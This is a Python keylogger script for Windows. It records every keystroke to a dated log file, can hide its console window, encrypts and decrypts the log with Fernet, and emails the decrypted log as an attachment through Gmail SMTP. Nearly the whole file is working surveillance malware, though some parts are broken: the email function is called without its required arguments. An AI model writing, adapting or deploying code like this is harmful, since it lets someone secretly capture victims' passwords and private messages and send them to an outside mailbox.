from email import encoders
import ssl
import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from cryptography.fernet import Fernet
from win32 import win32console, win32gui
from pynput.keyboard import Listener
from datetime import datetime


date_time = datetime.now().strftime("%Y-%m-%d")
logger_title = f'keylogger_{date_time}.txt'
logger = open(logger_title, 'a')

keyboard.add_hotkey('ctrl + c', print, args=('Hotkey', 'Detected'))
keyboard.add_hotkey('alt + tab', print, args=('Hotkey', 'Detected'))

def email(username, password, reciver, sub):
    sent_from = username
    password = password

    sent_to = reciver
    subject = sub

    msg = MIMEMultipart("alternative")
    msg["Subject"] = subject
    msg["From"] = sent_from
    msg["To"] = sent_to

    html = f"""
        <html>
            <body>
                Hi {sent_to} <br />
                <p>This is the report</p>
            </body>
        <html>
    """

    htm_text = MIMEText(html, "html")
    msg.attach(htm_text)
    context = ssl.create_default_context()
    attach_content = f'dec_{logger_title}'
    with open(attach_content, "rb") as f: 
       a_content = MIMEBase("application", "octet-stream")
       a_content.set_payload(f.read())
       encoders.encode_base64(a_content)
       msg.attach(a_content)
       email_msg = msg.as_string()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sent_from, password)
        server.sendmail(sent_from, sent_to, email_msg)
        print('Email sent!')
      

#generate a key for encryption and decryption
fernet_key = Fernet.generate_key()
def generate_key():
    with open('key.key', 'wb') as f:
        f.write(fernet_key)

def load_key():
    with open('key.key', 'rb') as r:
        fernet_key = r.read()
        return fernet_key

def encrypt_file(file_address):
    f = Fernet(load_key())
    with open(file_address, 'rb') as original_file:
        original = original_file.read()
        encrypted = f.encrypt(original)
    with open(f'enc_{file_address}', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

def decrypt_file(file_address):
    f = Fernet(load_key())
    with open(f'enc_{file_address}', 'rb') as encrypted_file:
        encrypted = encrypted_file.read()
        decrypted = f.decrypt(encrypted)
    with open(f'dec_{file_address}', 'wb') as decrypted_file:
        decrypted_file.write(decrypted)
        
def hide():
    # Hide Console
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True

def keyboard_event(value):  
    key = str(value)
    if key == "'\\x03'":
        email()
        logger.close()
        quit()
    elif key == 'Key.space':
        logger.write(" ")
    elif key == 'Key.enter':
        logger.write('\n')
    elif key == 'Key.backspace':
        logger.write("%%DELETE%%")
    elif key == 'Key.alt':
        logger.write("%%ALT%%")
    elif key == 'Key.tab':
        logger.write("  ")
    elif key == 'Key.ctrl_l':
        logger.write("%%CTRL%%")
    else:
        item = key.replace("'", "")
        logger.write(item)

def on_press(value):
    keyboard_event(value)

with Listener(on_press=on_press) as listener:
    # hide()
    generate_key()
    load_key()
    encrypt_file(logger_title)
    decrypt_file(logger_title)
    listener.join()

